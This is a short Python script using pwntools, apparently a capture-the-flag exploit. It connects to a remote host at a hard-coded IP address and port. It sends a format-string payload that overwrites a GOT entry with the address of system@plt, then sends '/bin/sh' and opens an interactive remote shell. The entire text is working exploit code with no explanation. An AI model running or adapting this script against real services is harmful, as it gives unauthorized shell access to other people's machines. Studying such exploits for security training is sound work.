from pwn import *

target = remote('202.98.28.108',9896)

addr_prt = 0x0804a00c

sys_plt = 0x8048410

payload = fmtstr_payload(5,{addr_prt:sys_plt})

target.sendline(payload)

payload = '/bin/sh\x00'

target.sendline(payload)

target.interactive()
